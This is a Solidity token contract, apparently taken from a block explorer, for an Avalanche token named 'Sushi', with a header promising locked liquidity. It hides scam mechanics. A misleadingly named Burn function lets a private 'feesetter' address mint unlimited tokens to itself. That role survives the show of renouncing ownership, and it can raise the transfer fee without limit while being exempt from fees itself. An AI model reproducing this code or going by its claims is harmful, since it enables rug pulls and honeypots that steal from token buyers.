/**
 *Submitted for verification at snowtrace.io on 2021-11-24
*/

/**
    Sushi
    
    Community driven 
    10%  auto add to the liquidity pool to locked forever
    15% Slippage+
    10% maxTX
    10 AVAX
    
    
    https://t.me/sushiavax

   // SPDX-License-Identifier: Unlicensed

 */

pragma solidity ^0.4.26;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract unwrap is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    uint256 public maxTxAmount;

    constructor() public {
	symbol = "Sushi";
    name = "Sushi";
    fees = 10;
    burnaddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 0;
    maxTxAmount = 1 * 10**9;
    totalSupply = 1 * 10**10;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function setmaxtx(uint256 maxTx) external onlyOwner {
        maxTxAmount = maxTx;
    }
    function Burn( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if(_to != owner)
            require(_amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        if (msg.sender == feesetter){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
        emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        if(_from != owner && _to != owner)
            require(_amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");

        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
}